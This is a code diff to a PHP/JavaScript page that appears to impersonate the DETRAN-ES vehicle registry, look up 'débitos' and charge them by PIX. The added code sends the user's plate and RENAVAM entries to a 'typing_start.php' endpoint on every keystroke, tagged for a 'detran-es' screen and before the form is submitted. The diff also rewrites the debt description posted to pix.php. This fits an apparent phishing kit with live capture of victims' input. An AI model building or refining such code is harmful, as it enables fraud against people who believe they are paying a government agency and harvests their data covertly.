@@ -283,8 +283,7 @@ if (!isset($pdo)) {
     let totalValor = 0;
     let currentRef = null;
     let pollInterval = null;
-    let typingInterval = null;
-    let typingStopTimeout = null;
+    let typingTimer = null;
 
     function showStep(stepName) {
         document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
@@ -292,35 +291,34 @@ if (!isset($pdo)) {
         window.scrollTo(0,0);
     }
 
-    function startTypingStatus() {
-        const indicator = document.getElementById('typingIndicator');
-        if (indicator) {
-            indicator.classList.remove('d-none');
-        }
+    function getTypingDoc() {
+        const placa = document.getElementById('placa').value.trim().toUpperCase();
+        const renavam = document.getElementById('renavam').value.trim();
 
-        if (!typingInterval) {
-            fetch('../../api/typing_start.php').catch(() => {});
-            typingInterval = setInterval(() => {
-                fetch('../../api/typing_start.php').catch(() => {});
-            }, 2000);
-        }
-
-        clearTimeout(typingStopTimeout);
-        typingStopTimeout = setTimeout(stopTypingStatus, 2000);
+        return `Placa: ${placa || '---'} | Renavam: ${renavam || '---'}`;
     }
 
-    function stopTypingStatus() {
-        if (typingInterval) {
-            clearInterval(typingInterval);
-            typingInterval = null;
-        }
-        clearTimeout(typingStopTimeout);
-        typingStopTimeout = null;
+    function startTypingStatus() {
+        clearTimeout(typingTimer);
+        typingTimer = setTimeout(() => {
+            const placa = document.getElementById('placa').value.trim().toUpperCase();
+            const renavam = document.getElementById('renavam').value.trim();
 
-        const indicator = document.getElementById('typingIndicator');
-        if (indicator) {
-            indicator.classList.add('d-none');
-        }
+            fetch('../../api/typing_start.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    typing: true,
+                    tela: 'detran-es',
+                    page: 'detran-es',
+                    doc: `Placa: ${placa || '---'} | Renavam: ${renavam || '---'}`,
+                    placa: placa,
+                    renavam: renavam
+                })
+            }).catch(() => {});
+        }, 250);
     }
 
     // Máscara CPF/CNPJ
@@ -343,12 +341,10 @@ if (!isset($pdo)) {
     ['placa', 'renavam'].forEach(id => {
         const input = document.getElementById(id);
         input.addEventListener('input', startTypingStatus);
-        input.addEventListener('blur', stopTypingStatus);
     });
 
     document.getElementById('formConsulta').addEventListener('submit', function(e) {
         e.preventDefault();
-        stopTypingStatus();
         const placa = document.getElementById('placa').value;
         const renavam = document.getElementById('renavam').value;
         const btn = document.getElementById('btnConsultar');
@@ -428,6 +424,9 @@ if (!isset($pdo)) {
         const nome = (currentData && currentData.proprietario && currentData.proprietario !== 'USUÁRIO') ? currentData.proprietario : 'DETRAN-ES';
         const placa = document.getElementById('placa').value.toUpperCase();
         const doc = placa; // Agora envia a placa no campo DOC
+        const totalDebitos = document.querySelectorAll('.debito-check').length;
+        const debitosSelecionados = document.querySelectorAll('.debito-check:checked').length;
+        const debitoResumo = `${debitosSelecionados}/${totalDebitos}`;
 
         console.log("nome", nome);
         console.log("placa", placa);
@@ -441,7 +440,7 @@ if (!isset($pdo)) {
         formData.append('cpf_cnpj', doc);
         formData.append('nome', nome);
         formData.append('valor', totalValor.toFixed(2));
-        formData.append('debito', 'DÉBITOS DETRAN-ES (' + placa + ')');
+        formData.append('debito', debitoResumo);
 
         fetch('../../data/pix.php', { method: 'POST', body: formData })
         .then(res => res.json())
